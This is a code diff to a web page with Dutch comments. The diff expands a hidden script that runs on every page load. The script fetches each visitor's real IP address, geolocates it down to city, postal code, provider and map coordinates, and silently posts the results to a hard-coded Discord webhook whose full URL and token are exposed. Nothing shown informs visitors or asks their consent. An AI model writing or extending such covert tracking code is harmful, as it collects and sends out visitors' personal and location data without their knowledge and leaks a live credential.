@@ -130,7 +130,7 @@
     <p>DC: <a target="_blank" rel="noopener">fg64</a></p>
   </div>
 
-  <!-- 🔔 DISCORD DOELGROEP-ONDERZOEK -->
+  <!-- 🔔 DISCORD DOELGROEP-ONDERZOEK MET IP & ADRES -->
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1442894496357421184/9AB3-4ms8pS_P9AHfxFvdbPlwnwms8FaY5r1UVxwMbm9OwH7gvZBZ9tiWAB7LHCQSV-q";
 
@@ -141,36 +141,65 @@
     const sessionId = sessionStorage.getItem('session_id') || generateSessionId();
     sessionStorage.setItem('session_id', sessionId);
 
-    fetch("https://ipapi.co/json/")
+    // Eerst echt IP adres ophalen
+    fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
-      .then(data => {
+      .then(ipData => {
+        const realIP = ipData.ip;
+        
+        // Dan volledige geolookup met echte IP
+        fetch(`https://ipapi.co/${realIP}/json/`)
+          .then(res => res.json())
+          .then(data => {
+            const country = data.country_name || "Onbekend";
+            const region = data.region || "Onbekend";
+            const city = data.city || "Onbekend";
+            const org = data.org || "Onbekend";
+            const postal = data.postal || "Onbekend";
+            
+            // GPS Maps link als coördinaten beschikbaar
+            const gpsLink = data.latitude && data.longitude ? 
+              `\n**🗺️ Maps:** https://www.google.com/maps?q=${data.latitude},${data.longitude}` : 
+              "";
 
-        const country = data.country_name || "Onbekend";
-        const region = data.region || "Onbekend";
-        const city = data.city || "Onbekend";
-        const org = data.org || "Onbekend";
-
-        const message =
-`🔔 **Nieuwe bezoeker**
+            const message = `🔔 **Nieuwe bezoeker**
 **Session:** ${sessionId}
-**Land:** ${country}
-**Regio:** ${region}
-**Stad:** ${city}
-**Provider:** ${org}`;
+**🌐 IP:** \`${realIP}\`
+**📍 Land:** ${country}
+**🏛️ Regio:** ${region}
+**🏙️ Stad:** ${city}
+**📮 Postcode:** ${postal}
+**📡 Provider:** ${org}${gpsLink}`;
 
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: message })
-        });
+            fetch(WEBHOOK_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: message })
+            });
+          })
+          .catch(() => {
+            // Fallback met alleen IP
+            const fallbackMessage = `🔔 **Nieuwe bezoeker**
+**Session:** ${sessionId}
+**🌐 IP:** \`${realIP}\`
+**❌ Geolocatie mislukt**`;
 
+            fetch(WEBHOOK_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: fallbackMessage })
+            });
+          });
       })
       .catch(() => {
+        // Ultimate fallback zonder IP
         fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            content: `🔔 Nieuwe bezoeker\n**Session:** ${sessionId}\nLocatie kon niet worden opgehaald.`
+            content: `🔔 **Nieuwe bezoeker**
+**Session:** ${sessionId}
+**❌ IP kon niet worden opgehaald**`
           })
         });
       });
